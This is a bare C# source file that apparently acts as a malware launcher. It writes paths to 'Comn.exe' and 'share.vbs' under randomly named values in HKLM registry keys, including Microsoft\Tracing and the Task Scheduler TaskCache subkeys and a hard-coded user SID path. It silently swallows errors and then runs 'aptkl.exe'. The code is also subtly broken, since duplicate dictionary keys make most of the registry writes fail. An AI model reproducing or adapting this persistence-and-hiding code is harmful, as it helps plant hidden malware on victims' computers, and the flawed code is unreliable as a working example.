using System;
using System.Threading;
using System.Reflection;
using System.Reflection.Emit;
using System.IO;
using Microsoft.Win32;
using System.Diagnostics;
using System.Windows;
using System.Collections;
using System.Collections.Generic;
using System.Configuration;
using System.Linq;
using System.Text;
using System.Runtime.InteropServices;

class Ts
	{

	public static Dictionary<string, string> RegSz = 
            new Dictionary<string, string>();

	public static void SetValues( string pa ){

        	RegSz.Add("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Tracing\\", pa + "\\Comn.exe");
        	RegSz.Add("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Tracing\\", pa + "\\share.vbs");
		RegSz.Add("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Logon\\", pa + 					"\\Comn.exe");
		RegSz.Add("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Logon\\", pa + 					"\\share.vbs");
		RegSz.Add("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Plain\\", pa + 					"\\share.vbs");
		RegSz.Add("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Plain\\", pa + 					"\\Comn.exe");
		RegSz.Add("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tasks\\", pa + 					"\\share.vbs");
		RegSz.Add("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tasks\\", pa + 					"\\Comn.exe");
		RegSz.Add("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\", pa + 					"\\share.vbs");
		RegSz.Add("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\", pa + 					"\\Comn.exe");
		RegSz.Add("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Tracing\\", pa + "\\share.vbs");
		RegSz.Add("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Tracing\\", pa + "\\Comn.exe");
		RegSz.Add("HKEY_LOCAL_MACHINE\\SOFTWARE\\", pa + "\\share.vbs");
		RegSz.Add("HKEY_LOCAL_MACHINE\\SOFTWARE\\", pa + "\\Comn.exe");
		RegSz.Add("HKEY_LOCAL_MACHINE\\S-1-5-21-1266725278-3163234071-714638740-1000\\Software\\Microsoft\\", pa + 						"\\share.vbs");
		
	}

	public static string GetRandomHexNumber(int digits)
	{
		Random random = new Random();
    		byte[] buffer = new byte[digits / 2];
    		random.NextBytes(buffer);
    		string result = String.Concat(buffer.Select(x => x.ToString("X2")).ToArray());
    		if (digits % 2 == 0)
        		return result;
    		return result + random.Next(16).ToString("X");
	}		
	
	public static void SetSz( string SzKey, string Var ){
		try{
			string rnd = GetRandomHexNumber(16);
			Registry.SetValue(
				SzKey,
				rnd,
				Var
			);		
		}  catch{
			try{
			 	Registry.SetValue(
						SzKey,
						"S-1-5-21-1266725278-3163234071-714638740-1000",
						Var,
						RegistryValueKind.QWord
					);	
			 	} catch {
			}
		}
	
	}


	public static void Main(string [] args){
		string pt = Directory.GetCurrentDirectory();
		try {
			SetValues( pt ); } catch (Exception t){
				Console.Write(t);
				string pa = pt + "\\aptkl.exe";
				System.Diagnostics.Process.Start(pa);
			}
		foreach( KeyValuePair<string, string> kvp in RegSz )
        	{
			try {
                		SetSz(kvp.Key, kvp.Value); } catch {}
        	}
		string pk = pt + "\\aptkl.exe";
		System.Diagnostics.Process.Start(pk); 
	}
}
















